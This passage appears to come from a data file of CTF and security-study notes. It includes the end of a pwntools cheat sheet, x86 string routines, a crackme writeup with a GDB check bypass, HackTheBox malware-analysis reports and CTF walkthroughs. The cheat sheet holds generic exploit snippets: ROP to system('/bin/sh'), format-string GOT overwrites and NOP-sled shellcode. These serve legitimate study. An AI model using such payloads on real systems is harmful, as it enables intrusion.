libc.address = leak - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")
\`\`\`

### ROP with pwntools
\`\`\`python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])    # Leak
rop.call('main')                        # Return to main
log.info(rop.dump())

# With libc after leak
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\\x00'))])
\`\`\`

### Format String Helper
\`\`\`python
# Automatic format string payload
from pwnlib.fmtstr import fmtstr_payload

# Overwrite target with value
payload = fmtstr_payload(offset, {target_addr: value})

# With context
payload = fmtstr_payload(offset, {elf.got['printf']: elf.symbols['system']})
\`\`\`

### Shellcode
\`\`\`python
# Generate shellcode
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())        # /bin/sh
shellcode = asm(shellcraft.cat('flag.txt'))  # cat flag

# NOP sled + shellcode
payload = b'\\x90' * 100 + shellcode
\`\`\`

### I/O Helpers
\`\`\`python
io.send(data)             # Send raw bytes
io.sendline(data)         # Send + newline
io.sendafter(b':', data)  # Wait for prompt, then send
io.sendlineafter(b'>', data)

io.recv(n)                # Receive n bytes
io.recvline()             # Receive until newline
io.recvuntil(b'>')        # Receive until delimiter
io.recvall()              # Receive everything

io.interactive()          # Interactive shell
\`\`\`

### ELF Symbols & Sections
\`\`\`python
elf.symbols['main']       # Address of main
elf.got['puts']           # GOT entry for puts
elf.plt['puts']           # PLT entry for puts
elf.search(b'/bin/sh')    # Search for string in binary

# With libc
libc.symbols['system']
libc.symbols['__free_hook']
next(libc.search(b'/bin/sh\\x00'))
\`\`\`

### SSH Connection
\`\`\`python
shell = ssh('user', 'host', password='pass', port=22)
io = shell.process('./vuln')
\`\`\`

---

## References
- [Crypto-Cat Template](https://github.com/Crypto-Cat/CTF/blob/main/pwn/official_template.py)
- [Pwntools Docs](https://docs.pwntools.com/en/stable/)
- [Pwntools Tutorial](https://github.com/Gallopsled/pwntools-tutorial)
`,
  },
  {
    id: "x86-ass-implementations",
    title: "x86 Assembly Implementations",
    excerpt: "x86 assembly language implementations covering common patterns, instruction set reference, calling conventions, and translating C to assembly.",
    category: "Binary Exploitation",
    content: `# x86 Assembly Implementations

**Assumptions:** 32-bit x86, stdcall convention, null-terminated C-strings. No prologue/epilogue shown (assume wrapped in proper function). Minimal error handling.

---

## String Length Functions

### strlen
**Prototype:** \`size_t strlen(const char* str);\`  
**Returns:** Length excluding null terminator

\`\`\`asm
mov edi, [ebp+8]    ; str
xor eax, eax        ; AL=0 (search for null)
or ecx, -1          ; max count
repne scasb         ; scan until null found
not ecx             ; ECX = scanned bytes (len+1)
dec ecx             ; exclude null terminator
mov eax, ecx        ; return length
\`\`\`

### strnlen
**Prototype:** \`size_t strnlen(const char* str, size_t maxlen);\`  
**Returns:** Length up to maxlen, excluding null

\`\`\`asm
mov edi, [ebp+8]    ; str
mov ecx, [ebp+0Ch]  ; maxlen
xor eax, eax        ; AL=0
jecxz done          ; if maxlen=0, return 0
repne scasb         ; scan for null or maxlen reached
jne no_null         ; maxlen reached without null
inc ecx             ; null found, adjust
no_null:
mov eax, [ebp+0Ch]  ; maxlen
sub eax, ecx        ; actual length
done:
\`\`\`

---

## String Search Functions

### strchr
**Prototype:** \`char* strchr(const char* str, int ch);\`  
**Returns:** Pointer to first occurrence of ch, or NULL

\`\`\`asm
mov edi, [ebp+8]    ; str
mov al, [ebp+0Ch]   ; ch (byte)
or ecx, -1          ; max count
repne scasb         ; scan for AL
jne not_found       ; no match
lea eax, [edi-1]    ; back up to match position
jmp done
not_found:
xor eax, eax        ; return NULL
done:
\`\`\`

### strrchr
**Prototype:** \`char* strrchr(const char* str, int ch);\`  
**Returns:** Pointer to last occurrence of ch, or NULL

\`\`\`asm
mov edi, [ebp+8]    ; str
mov dl, [ebp+0Ch]   ; ch to find
xor eax, eax        ; last found = NULL
scan_loop:
mov cl, [edi]       ; current char
test cl, cl         ; check for null
jz done             ; end of string
cmp cl, dl          ; compare with ch
jne next
mov eax, edi        ; update last found
next:
inc edi
jmp scan_loop
done:
\`\`\`

### strstr
**Prototype:** \`char* strstr(const char* haystack, const char* needle);\`  
**Returns:** Pointer to first occurrence of substring, or NULL

\`\`\`asm
mov edi, [ebp+8]    ; haystack
mov esi, [ebp+0Ch]  ; needle
mov al, [esi]       ; first char of needle
test al, al         ; empty needle?
jz found_at_start   ; return haystack
outer_loop:
mov cl, [edi]       ; current haystack char
test cl, cl         ; end of haystack?
jz not_found
cmp cl, al          ; first char match?
jne next_pos
; Check full substring
push edi
push esi
inc edi
inc esi
inner_loop:
mov dl, [esi]       ; needle char
test dl, dl         ; end of needle?
jz match_found
cmp dl, [edi]       ; compare
jne no_match
inc edi
inc esi
jmp inner_loop
match_found:
pop esi
pop eax             ; return start position
jmp done
no_match:
pop esi
pop edi
next_pos:
inc edi
jmp outer_loop
not_found:
xor eax, eax        ; return NULL
jmp done
found_at_start:
mov eax, edi        ; return haystack
done:
\`\`\`

---

## Memory Operations

### memcpy
**Prototype:** \`void* memcpy(void* dst, const void* src, size_t n);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
mov ecx, [ebp+10h]  ; n (byte count)
rep movsb           ; copy ECX bytes
mov eax, [ebp+8]    ; return dst
\`\`\`

### memset
**Prototype:** \`void* memset(void* dst, int ch, size_t n);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov al, [ebp+0Ch]   ; ch (byte value)
mov ecx, [ebp+10h]  ; n (byte count)
rep stosb           ; fill ECX bytes with AL
mov eax, [ebp+8]    ; return dst
\`\`\`

### memcmp
**Prototype:** \`int memcmp(const void* s1, const void* s2, size_t n);\`  
**Returns:** 0 if equal, <0 if s1<s2, >0 if s1>s2

\`\`\`asm
mov edi, [ebp+8]    ; s1
mov esi, [ebp+0Ch]  ; s2
mov ecx, [ebp+10h]  ; n
jecxz equal         ; n=0, consider equal
repe cmpsb          ; compare until mismatch
je equal            ; all bytes matched
mov al, [edi-1]     ; last byte from s1
sub al, [esi-1]     ; difference (s1-s2)
movsx eax, al       ; sign extend
jmp done
equal:
xor eax, eax        ; return 0
done:
\`\`\`

---

## String Comparison

### strcmp
**Prototype:** \`int strcmp(const char* s1, const char* s2);\`  
**Returns:** 0 if equal, <0 if s1<s2, >0 if s1>s2

\`\`\`asm
mov edi, [ebp+8]    ; s1
mov esi, [ebp+0Ch]  ; s2
cmp_loop:
mov al, [edi]       ; char from s1
mov dl, [esi]       ; char from s2
cmp al, dl          ; compare
jne not_equal       ; difference found
test al, al         ; both null?
jz equal            ; yes, strings equal
inc edi
inc esi
jmp cmp_loop
not_equal:
movzx eax, al       ; zero-extend s1 char
movzx edx, dl       ; zero-extend s2 char
sub eax, edx        ; return difference
jmp done
equal:
xor eax, eax        ; return 0
done:
\`\`\`

### strncmp
**Prototype:** \`int strncmp(const char* s1, const char* s2, size_t n);\`  
**Returns:** 0 if equal up to n chars, <0 if s1<s2, >0 if s1>s2

\`\`\`asm
mov edi, [ebp+8]    ; s1
mov esi, [ebp+0Ch]  ; s2
mov ecx, [ebp+10h]  ; n
jecxz equal         ; n=0, equal
cmp_loop:
mov al, [edi]       ; char from s1
mov dl, [esi]       ; char from s2
cmp al, dl          ; compare
jne not_equal
test al, al         ; null terminator?
jz equal
inc edi
inc esi
loop cmp_loop       ; decrement ECX, loop if not zero
equal:
xor eax, eax        ; return 0
jmp done
not_equal:
movzx eax, al
movzx edx, dl
sub eax, edx        ; return difference
done:
\`\`\`

---

## String Copy Functions

### strcpy
**Prototype:** \`char* strcpy(char* dst, const char* src);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
copy_loop:
lodsb               ; load byte from [esi] to AL, inc esi
stosb               ; store AL to [edi], inc edi
test al, al         ; null terminator?
jnz copy_loop       ; continue if not
mov eax, [ebp+8]    ; return dst
\`\`\`

### strncpy
**Prototype:** \`char* strncpy(char* dst, const char* src, size_t n);\`  
**Returns:** dst pointer (may not be null-terminated if src >= n chars)

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
mov ecx, [ebp+10h]  ; n
jecxz done          ; if n=0, nothing to copy
copy_loop:
lodsb               ; load from src
stosb               ; store to dst
test al, al         ; was it null?
loopnz copy_loop    ; continue if not null and ecx>0
; Pad with nulls if needed
jz pad_nulls
jmp done
pad_nulls:
xor al, al          ; AL=0
rep stosb           ; fill rest with nulls
done:
mov eax, [ebp+8]    ; return dst
\`\`\`

---

## String Concatenation

### strcat
**Prototype:** \`char* strcat(char* dst, const char* src);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
; Find end of dst
xor eax, eax        ; search for null
or ecx, -1          ; max count
repne scasb         ; find null in dst
dec edi             ; back to null position
; Copy src to end
cat_loop:
lodsb               ; load from src
stosb               ; store to dst
test al, al         ; null terminator?
jnz cat_loop
mov eax, [ebp+8]    ; return dst
\`\`\`

### strncat
**Prototype:** \`char* strncat(char* dst, const char* src, size_t n);\`  
**Returns:** dst pointer (always null-terminated)

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
mov edx, [ebp+10h]  ; n
; Find end of dst
xor eax, eax
or ecx, -1
repne scasb
dec edi             ; back to null position
; Copy up to n chars
test edx, edx       ; n=0?
jz add_null
cat_loop:
lodsb               ; load from src
test al, al         ; src ended?
jz add_null
stosb               ; store to dst
dec edx             ; decrement n
jnz cat_loop        ; continue if n>0
add_null:
xor al, al          ; ensure null terminator
stosb
mov eax, [ebp+8]    ; return dst
\`\`\`

---

## String Modification

### strset
**Prototype:** \`char* strset(char* str, int ch);\`  
**Returns:** str pointer (sets all chars to ch, preserving null)

\`\`\`asm
mov edi, [ebp+8]    ; str
mov edx, edi        ; save dst pointer
xor eax, eax        ; AL=0
or ecx, -1          ; max count
repne scasb         ; find null terminator
add ecx, 2
neg ecx             ; ECX = string length
mov al, [ebp+0Ch]   ; ch (fill character)
mov edi, edx        ; reset to start
rep stosb           ; fill with ch
mov eax, edx        ; return str
\`\`\`

### strupr
**Prototype:** \`char* strupr(char* str);\`  
**Returns:** str pointer (converts to uppercase)

\`\`\`asm
mov edi, [ebp+8]    ; str
mov esi, edi        ; save for return
upper_loop:
mov al, [edi]       ; load char
test al, al         ; null terminator?
jz done
cmp al, 'a'         ; less than 'a'?
jb next_char
cmp al, 'z'         ; greater than 'z'?
ja next_char
sub al, 32          ; convert to uppercase
mov [edi], al       ; store back
next_char:
inc edi
jmp upper_loop
done:
mov eax, esi        ; return str
\`\`\`

### strlwr
**Prototype:** \`char* strlwr(char* str);\`  
**Returns:** str pointer (converts to lowercase)

\`\`\`asm
mov edi, [ebp+8]    ; str
mov esi, edi        ; save for return
lower_loop:
mov al, [edi]       ; load char
test al, al         ; null terminator?
jz done
cmp al, 'A'         ; less than 'A'?
jb next_char
cmp al, 'Z'         ; greater than 'Z'?
ja next_char
add al, 32          ; convert to lowercase
mov [edi], al       ; store back
next_char:
inc edi
jmp lower_loop
done:
mov eax, esi        ; return str
\`\`\`

---

## Notes
- String instructions (REP prefix) use ECX as counter
- Direction flag (DF) assumed clear (0) for forward processing
- SCASB: scan string (compare AL with [EDI]), increment/decrement EDI
- STOSB: store string (AL to [EDI]), increment/decrement EDI
- LODSB: load string ([ESI] to AL), increment/decrement ESI
- MOVSB: move string ([ESI] to [EDI]), increment/decrement both
- CMPSB: compare strings ([ESI] with [EDI]), increment/decrement both`,
  },
  {
    id: "segfault",
    title: "Program Behavior (Runtime Overview)",
    excerpt: "Crackme writeup for SEGFAULT challenge, demonstrating reverse engineering techniques to find the correct input that satisfies binary validation checks.",
    category: "Reverse Engineering",
    content: `# Program Behavior (Runtime Overview)

When you run the binary (./a.out):

1. It prompts: "username:" (inferred from first puts at <+30> and your GDB run).
2. You enter a string (up to ~128 chars, via fgets).
3. It strips any trailing newline.
4. Checks the length (post-strip): Must be 8 to 12 inclusive. If not, prints "wrong length!" (inferred) and loops back to prompt again (infinite retries).
5. If length OK, prompts: "serial number:" (inferred from second puts at <+171>).
6. You enter a floating-point number (via scanf "%lf").
7. Processes your username: Alternates case (even indices lowercase, odd uppercase).
8. Takes the first 8 bytes of this processed string, interprets as integer via atoi.
9. Converts that integer to double.
10. Compares it (floating-point) to your entered serial number.
11. If equal: Prints "s/n OK!" (confirmed in your GDB output at <+525>).
12. If not: Prints "s/n WRONG!" (at <+539>).
13. Exits with code 0.

![alt text](/MyNotes/images/image.png)

## Edge Cases

- Too short/long username: Loops forever with "wrong length!".
- Non-numeric processed username: atoi returns 0 → enter "0" as serial to succeed.
- Negative numbers: Possible if username starts with '-' (e.g., "-1234567" → enter "-1234567").
- Floating-point input: You can enter decimals (e.g., 123.0), but since the left side is integer-derived, fractional parts must match exactly (i.e., .0).

No anti-debugging, no encryption

---

# Disassembly Breakdown
# Disassembly Breakdown

The main function is ~577 bytes, with a loop for username processing and standard libc calls. I'll group it into logical sections.

## Setup and Canary (Stack Protection)

\`\`\`text
0x555555555289 <+0>:   endbr64               ; Intel CET (Control-flow Enforcement)
0x55555555528d <+4>:   push rbp
0x55555555528e <+5>:   mov rbp,rsp
0x555555555291 <+8>:   sub rsp,0x140         ; Allocate 320 bytes stack space
0x555555555298 <+15>:  mov rax,QWORD PTR fs:0x28  ; Load stack canary
0x5555555552a1 <+24>:  mov QWORD PTR [rbp-0x8],rax ; Store canary
0x5555555552a5 <+28>:  xor eax,eax          ; Clear EAX
\`\`\`

- Standard prologue: Sets up stack frame, allocates buffers.
- Buffers: [rbp-0x110] (username, ~128 bytes), [rbp-0x90] (processed username), [rbp-0x120] (first 8 bytes copy), [rbp-0x128] (serial double).
- Canary prevents stack overflows (checked at end).

## Username Input Loop

\`\`\`text
0x5555555552a7 <+30>:  lea rdi,[rip+0xd5a]   ; Load "username:" string addr
0x5555555552ae <+37>:  call puts@plt
0x5555555552b3 <+42>:  mov rax,QWORD PTR [rip+0x2d56] ; stdout
0x5555555552ba <+49>:  mov rdi,rax
0x5555555552bd <+52>:  call fflush@plt       ; Flush output
0x5555555552c2 <+57>:  mov rdx,QWORD PTR [rip+0x2d57] ; stdin
0x5555555552c9 <+64>:  lea rax,[rbp-0x110]   ; Username buffer
0x5555555552d0 <+71>:  mov esi,0x80          ; Max 128 chars
0x5555555552d5 <+76>:  mov rdi,rax
0x5555555552d8 <+79>:  call fgets@plt        ; Read input
0x5555555552dd <+84>:  lea rax,[rbp-0x110]
0x5555555552e4 <+91>:  lea rsi,[rip+0xd27]   ; "\\n" string
0x5555555552eb <+98>:  mov rdi,rax
0x5555555552ee <+101>: call strcspn@plt     ; Find newline pos
0x5555555552f3 <+106>: mov BYTE PTR [rbp+rax*1-0x110],0x0 ; Null out newline
0x5555555552fb <+114>: lea rax,[rbp-0x110]
0x555555555302 <+121>: mov rdi,rax
0x555555555305 <+124>: call strlen@plt      ; Get length
0x55555555530a <+129>: mov DWORD PTR [rbp-0x134],eax ; Store length
0x555555555310 <+135>: cmp DWORD PTR [rbp-0x134],0x7 ; If <=7
0x555555555317 <+142>: jle 0x555555555322 <main+153>
0x555555555319 <+144>: cmp DWORD PTR [rbp-0x134],0xc ; If >12
0x555555555320 <+151>: jle 0x555555555333 <main+170> ; Proceed if 8-12
0x555555555322 <+153>: lea rdi,[rip+0xcef]   ; "wrong length!"
0x555555555329 <+160>: call puts@plt
0x55555555532e <+165>: jmp 0x5555555552a7 <main+30> ; Loop back
\`\`\`

- Infinite loop until valid length.
- Uses fgets for safe input (no overflow risk).
- strcspn + null: Cleanly removes newline.

## Serial Number Input

\`\`\`text
0x555555555333 <+170>: nop
0x555555555334 <+171>: lea rdi,[rip+0xd00]   ; "serial number:"
0x55555555533b <+178>: call puts@plt
0x555555555340 <+183>: mov rax,QWORD PTR [rip+0x2cc9] ; stdout
0x555555555347 <+190>: mov rdi,rax
0x55555555534a <+193>: call fflush@plt
0x55555555534f <+198>: lea rax,[rbp-0x128]   ; Serial double buffer
0x555555555356 <+205>: mov rsi,rax
0x555555555359 <+208>: lea rdi,[rip+0xcea]   ; "%lf" format
0x555555555360 <+215>: mov eax,0x0
0x555555555365 <+220>: call __isoc99_scanf@plt ; Read double
\`\`\`

Prompts and reads a double (allows decimals, but int match needed).

## Username Processing Loop

\`\`\`text
0x55555555536a <+225>: lea rax,[rbp-0x110]
0x555555555371 <+232>: mov rdi,rax
0x555555555374 <+235>: call strlen@plt       ; Re-get length (redundant?)
0x555555555379 <+240>: mov DWORD PTR [rbp-0x130],eax
0x55555555537f <+246>: mov DWORD PTR [rbp-0x13c],0x0 ; Processed idx = 0
0x555555555389 <+256>: mov DWORD PTR [rbp-0x138],0x0 ; Loop idx = 0
0x555555555393 <+266>: jmp 0x55555555541a <main+401> ; Check loop cond
[Loop body]
0x555555555398 <+271>: mov eax,DWORD PTR [rbp-0x138] ; idx
0x55555555539e <+277>: and eax,0x1           ; idx % 2
0x5555555553a1 <+280>: test eax,eax
0x5555555553a3 <+282>: jne 0x5555555553dd <main+340> ; If odd: toupper
[Even path]
0x5555555553a5 <+284>: ... tolower ...
[Odd path]
0x5555555553dd <+340>: ... toupper ...
[Common]
0x555555555413 <+394>: add DWORD PTR [rbp-0x138],0x1 ; idx++
0x55555555541a <+401>: mov eax,DWORD PTR [rbp-0x138]
0x555555555420 <+407>: cmp eax,DWORD PTR [rbp-0x130] ; idx < len
0x555555555426 <+413>: jl 0x555555555398 <main+271> ; Loop
0x55555555542c <+419>: mov eax,DWORD PTR [rbp-0x13c] ; processed len
0x555555555432 <+425>: cdqe
0x555555555434 <+427>: mov BYTE PTR [rbp+rax*1-0x90],0x0 ; Null terminate
\`\`\`

- Alternates case per position (even: lower, odd: upper).
- Builds in [rbp-0x90].
- Handles letters only; digits/symbols unchanged.

## Final Processing and Comparison

\`\`\`text
0x55555555543c <+435>: lea rcx,[rbp-0x90]     ; Processed buf
0x555555555443 <+442>: lea rax,[rbp-0x120]    ; Copy buf
0x55555555544a <+449>: mov edx,0x8           ; 8 bytes
0x55555555544f <+454>: mov rsi,rcx
0x555555555452 <+457>: mov rdi,rax
0x555555555455 <+460>: call strncpy@plt      ; Copy first 8
0x55555555545a <+465>: mov BYTE PTR [rbp-0x118],0x0 ; Null at pos 8
0x555555555461 <+472>: lea rax,[rbp-0x120]
0x555555555468 <+479>: mov rdi,rax
0x55555555546b <+482>: call atoi@plt         ; Parse to int
0x555555555470 <+487>: mov DWORD PTR [rbp-0x12c],eax ; Store int
0x555555555476 <+493>: pxor xmm0,xmm0
0x55555555547a <+497>: cvtsi2sd xmm0,DWORD PTR [rbp-0x12c] ; Int to double
0x555555555482 <+505>: movsd xmm1,QWORD PTR [rbp-0x128] ; Load serial
0x55555555548a <+513>: ucomisd xmm0,xmm1     ; Compare doubles
0x55555555548e <+517>: jp 0x5555555554a4     ; If NaN/parity
0x555555555490 <+519>: ucomisd xmm0,xmm1     ; Re-compare (redundant?)
0x555555555494 <+523>: jne 0x5555555554a4    ; If not equal → fail
[Success]
0x555555555496 <+525>: lea rdi,[rip+0xbb1]   ; "s/n OK!"
0x55555555549d <+532>: call puts@plt
[Fail]
0x5555555554a4 <+539>: lea rdi,[rip+0xbab]   ; "s/n WRONG!"
0x5555555554ab <+546>: call puts@plt
\`\`\`

- strncpy + null: Ensures 8-char null-terminated string.
- atoi: Parses as signed int (handles '-', stops at non-digit).
- Float compare: Uses ucomisd (unordered compare) to handle NaN.

## Cleanup

\`\`\`text
0x5555555554b0 <+551>: mov eax,0x0           ; Return 0
... canary check ...
0x5555555554c9 <+576>: leave
0x5555555554ca <+577>: ret
\`\`\`

Exits cleanly.

---

# Key Checks and Logic

- Length Check: 8 ≤ len ≤ 12 → Forces controlled input size.
- Processing: Alternate case doesn't affect digits/symbols → Key for crafting numeric strings.
- Parsing: atoi on first 8 processed chars → Vulnerable to non-digits (defaults to 0 or partial parse).
- Comparison: Double equality → Exact match required, but integer-derived left side means serial must be integer-equivalent.
- No hashing or complex crypto → Purely didactic.

## Strings

Strings (from RIP offsets, confirm with x/s in GDB):

- 0x555555556008: "username:"
- 0x555555556018: "wrong length!"
- 0x55555555603b: "serial number:"
- 0x555555555604a: "%lf"
- 0x55555555604e: "s/n OK!"
- 0x555555556056: "s/n WRONG!"
- 0x555555556012: "\\n"

---

# Legitimate Solutions

Craft username so processed first-8 parses to desired int N, then enter N as serial.

- **Simple Positive**: Username "12345678" → Processed unchanged → atoi=12345678 → Serial=12345678
- **With Letters**: Username "1a2b3c4d" → Processed "1A2B3C4D" → atoi=123 (stops at 'A') → Serial=123
- **Negative**: Username "-9999999" → atoi=-9999999 → Serial=-9999999
- **Zero**: Any non-starting-with-digit (e.g., "password") → atoi=0 → Serial=0
- **Max Length**: "123456789abc" (12 chars) → First 8 "12345678" → Same as above.

Infinite possibilities — not a "fixed" key, but a relation between inputs.

---

# Cracking with GDB (Bypassing Checks)

As you did:

1. Break at <+523> (jne after compare).
2. When hit: jump *main+525 → Skip to success puts.`,
  },
  {
    id: "writeup",
    title: "Malware Analysis Report: Simple Encryptor",
    excerpt: "HackTheBox Simple Encryptor challenge writeup, reversing a PRNG-based file encryption scheme by recovering the seed and decrypting the flag.",
    category: "HTB Writeup",
    content: `# Malware Analysis Report: Simple Encryptor

## 1. Executive Summary
This report documents the reverse engineering of a binary named \`simple-encryptor\`. The binary performs a file encryption routine using a pseudo-random number generator (PRNG). The analysis reveals a vulnerability in the seed generation, allowing for the decryption of the target file (\`flag.enc\`) through a brute-force attack on the seed value.

## 2. Initial Assessment
The provided archive contains two files:
*   \`encrypt\`: An ELF executable.
*   \`flag.enc\`: An encrypted data file.

**Initial file identification:**
![File Identification](https://miro.medium.com/v2/resize:fit:799/1*UH_8_V_-rZgZizsEItOZUQ.png)

## 3. Static Analysis
Decompilation of the \`encrypt\` binary using Ghidra reveals the core logic within the \`main\` function.

**Decompilation Overview:**
![Ghidra Overview](https://miro.medium.com/v2/resize:fit:980/1*6iIpBEPdNrQK33UsMvIJxQ.png)

**Main Function Logic:**
![Main Function](https://miro.medium.com/v2/resize:fit:980/1*Pdx1UVZYrlRTOfSLWnwTcA.png)

The analysis of the \`main\` function identifies the following operations:
1.  **Seed Generation**: \`srand()\` is called to initialize the PRNG.
2.  **File Operations**: The program opens the flag file and determines its size.
3.  **Memory Allocation**: Memory is allocated to store the file contents.
4.  **Encryption**: The data is encrypted using values generated by \`rand()\`.

## 4. Cryptographic Weakness
The encryption relies on the C standard library's \`rand()\` function. The security of this scheme depends entirely on the unpredictability of the seed passed to \`srand()\`.

According to the C documentation:
> \`srand()\` seeds the pseudo-random number generator used by \`rand()\`. If \`rand()\` is used before any calls to \`srand()\`, \`rand()\` behaves as if it was seeded with \`srand(1)\`. Each time \`rand()\` is seeded with \`srand()\`, it must produce the same sequence of values.

This determinism implies that if the seed value can be recovered or guessed, the entire sequence of random numbers can be reproduced, allowing for decryption.

**Encryption Logic:**
![Encryption Logic](https://miro.medium.com/v2/resize:fit:482/1*pT6orV6mcQO2P8rwEIIOnw.png)

## 5. Decryption Strategy
To recover the original data, the encryption process must be reversed. Since the operation is likely a simple XOR or arithmetic operation with the random stream, the decryption logic mirrors the encryption.

**Decryption Logic:**
![Decryption Logic](https://miro.medium.com/v2/resize:fit:531/1*hT73dtkU-CAxPi0FdZAiyQ.png)

### Exploit Development
The analysis indicates the seed is a 4-byte integer. A brute-force approach was selected to identify the correct seed. The exploit iterates through possible seed values (specifically checking a range of 4-digit numbers as identified in the binary analysis), generates the corresponding random sequence, and attempts to decrypt the content.

**Exploit Code:**
![Exploit Code](https://miro.medium.com/v2/resize:fit:931/1*5RQ7O-CXLgLyBvyJ4J9V4A.png)

## 6. Results
The exploit successfully recovered the plaintext flag by identifying the correct seed.

**Recovered Flag:**
![Recovered Flag](https://miro.medium.com/v2/resize:fit:612/1*IvfT1o-WQ1oROlqeThPwXQ.png)

---
*Analysis generated on December 7, 2025.*`,
  },
  {
    id: "secretpictures",
    title: "Malware Analysis Report: SecretPictures",
    excerpt: "HackTheBox Sherlocks SecretPictures investigation writeup involving digital forensics analysis to uncover hidden data within image files.",
    category: "HTB Writeup",
    content: `# Malware Analysis Report: SecretPictures

## 1. Executive Summary
This report details the static and dynamic analysis of a suspicious binary. The analysis confirms the file is a malware sample written in **Go (Golang)**. It exhibits typical persistence mechanisms by modifying the Windows Registry, attempts to evade detection by copying itself to a hidden directory, and initiates network connections to a known malicious domain.

## 2. File Identification
Initial static analysis was performed to identify the file's properties and compilation language.

*   **MD5 Hash**: \`fd46d178474f32f596641ff0f7bb337e\`
*   **Programming Language**: \`GOLANG\`

**Static Analysis Overview (Cutter):**
![Static Analysis Overview](/MyNotes/images/Pasted_image_20251130123136.png)

## 3. Static Analysis
Further inspection of the binary's imports revealed specific API calls used for system reconnaissance.

### API Imports
The malware imports functions from \`Kernel32.dll\` to interact with the file system. Specifically, it utilizes **\`GetDriveType\`** (likely \`GetDriveTypeA\` or \`GetDriveTypeW\`) to enumerate and check the types of drives connected to the system.



## 4. Dynamic Analysis
Dynamic analysis was conducted using ANY.RUN to observe the malware's behavior in a controlled environment.

![ANY.RUN Analysis](/MyNotes/images/Pasted_image_20251207191613.png)

### File System Artifacts
Upon execution, the malware copies itself to a specific directory to establish a foothold.
*   **Dropped Folder**: \`Systemlogs\`

### Persistence Mechanism
To ensure it runs automatically upon system reboot, the malware modifies the Windows Registry.
*   **Registry Key**: \`HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\`
*   **Value Name**: \`HealthCheck\`

**Registry Modification Evidence:**
![Registry Key Modification](/MyNotes/images/Pasted_image_20251207192219.png)
![Persistence Entry](/MyNotes/images/Pasted_image_20251207192706.png)

### Network Activity
The malware attempts to establish a connection to a remote command and control (C2) server.
*   **FQDN**: \`malware.invalid.com\`

**Network Traffic Analysis:**
![Network Connection](/MyNotes/images/Pasted_image_20251207192742.png)

## 5. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| **MD5** | \`fd46d178474f32f596641ff0f7bb337e\` |
| **Domain** | \`malware.invalid.com\` |
| **File Path** | \`Systemlogs\` (Directory) |
| **Registry Key** | \`HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\` |
| **Registry Value** | \`HealthCheck\` |

---



![Import Analysis](/MyNotes/images/Pasted_image_20251207200950.png)



`,
  },
  {
    id: "day-1",
    title: "DAY 1",
    excerpt: "CyberStudents Day 1 challenge covering binary to ASCII, hex decoding, and Base64 encoding and decoding transformations to recover hidden flags.",
    category: "CTF Writeup",
    content: `Here is the challenge description:
![Image](/MyNotes/images/Pasted_image_20251221225724.png)

Output of the start.txt is as follows:
![Image](/MyNotes/images/Pasted_image_20251221225858.png)

## 🔹 Step 1: Binary → ASCII

Each group of **8 bits** represents **one ASCII character**.

Example:

\`00110101 → 53 (decimal) → '5' 00111001 → 57 → '9' 00110011 → 51 → '3'\`

Doing this for the entire sequence converts the binary into a readable ASCII string:

\`59334e6b6531637a624747774e664f474644533138334d4639685a48597a546a64664d6a41794e583033d\`

So after Step 1, we have a **hex-looking string** (characters 0–9 and a–f).

## 🔹 Step 2: ASCII → Hex decoding
That ASCII output is actually **hexadecimal**.

Hex pairs represent bytes:

\`59 → 'Y' 33 → '3' 4e → 'N' 6b → 'k' 65 → 'e' 31 → '1' 63 → 'c' 7a → 'z' ...\`

Decoding the entire hex string gives:

\`Y3NkezVlbGNvbWVfOGFDS180MF9hZHYzTjdfejAyNX0=\`

Now this clearly ends with \`=\` — a big hint 👀  
That means…
## 🔹 Step 3: Base64 decoding

The string is **Base64-encoded**.

Decoding it produces:

\`csd{W3lc0m3_8aCK_70_adv3N7_2025}\``,
  },
  {
    id: "day-2",
    title: "DAY 2",
    excerpt: "CyberStudents Day 2 challenge involving Wireshark packet capture analysis to extract credentials and hidden data from network traffic.",
    category: "CTF Writeup",
    content: `The challenge description is as follows:
![Image](/MyNotes/images/Pasted_image_20251221230433.png)

Open the file in wireshark and sorting according to length, I observed this:

![Image](/MyNotes/images/Pasted_image_20251221231253.png)

A User logged in successful message.

Sorting in Ascending we should get the sequence of steps that led to this:
![Image](/MyNotes/images/Pasted_image_20251221231647.png)

USERNAME: Elf67
PASSWORD: snowball

The flag is finally: csd{Elf67_snowball}
`,
  },
  {
    id: "day-3",
    title: "DAY 3",
    excerpt: "CyberStudents Day 3 challenge performing DNS chain reconnaissance to discover hidden subdomains and extract flag data from DNS records.",
    category: "CTF Writeup",
    content: `
Here is the challenge description:
![Image](/MyNotes/images/Pasted_image_20251221232236.png)

1️⃣ DMARC Record Leak

dig TXT _dmarc.krampus.csd.lol

DMARC revealed:

ruf=mailto:forensics@ops.krampus.csd.lol

→ Hidden subdomains discovered:

- \`ops.krampus.csd.lol\`
- \`forensics.ops.krampus.csd.lol\`

2️⃣ ops.krampus.csd.lol TXT Record

internal-services: _ldap._tcp.krampus.csd.lol _kerberos._tcp.krampus.csd.lol _metrics._tcp.krampus.csd.lol

→ Indicates Active Directory / Kerberos / internal monitoring.

3️⃣ SRV Records

dig SRV _metrics._tcp.krampus.csd.lol

Returned:

beacon.krampus.csd.lol:443

This is likely the C2 server.

4️⃣ Beacon TXT Record

dig TXT beacon.krampus.csd.lol

Output:

config=ZXhmaWwua3JhbXB1cy5jc2QubG9s==

Decode Base64:

exfil.krampus.csd.lol

5️⃣ exfil TXT Record

selector=syndicate

→ Indicates the DKIM selector.

6️⃣ DKIM TXT Record

dig syndicate._domainkey.krampus.csd.lol TXT

Returned Base64:

